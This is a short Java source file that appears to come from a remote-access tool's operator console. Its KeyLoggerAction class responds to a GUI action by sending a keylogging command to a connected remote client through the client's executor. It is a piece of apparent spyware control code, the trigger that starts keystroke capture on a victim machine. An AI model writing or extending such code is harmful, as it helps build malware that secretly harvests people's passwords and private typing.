package TableUtils.KeyLogger.Actions;

import Server.Client;
import Utilities.GetSYS;
import TableUtils.KeyLogger.Constants.KeyLog;
import TableUtils.KeyLogger.Events.KeyloggerEvent;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class KeyLoggerAction implements ActionListener {

    private final KeyLog keyLog;

    public KeyLoggerAction(KeyLog keyLog) {
        this.keyLog = keyLog;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Client client = GetSYS.getClientHandler();
        assert client != null;
        client.getExecutor().submit(new KeyloggerEvent(client, keyLog));
    }
}
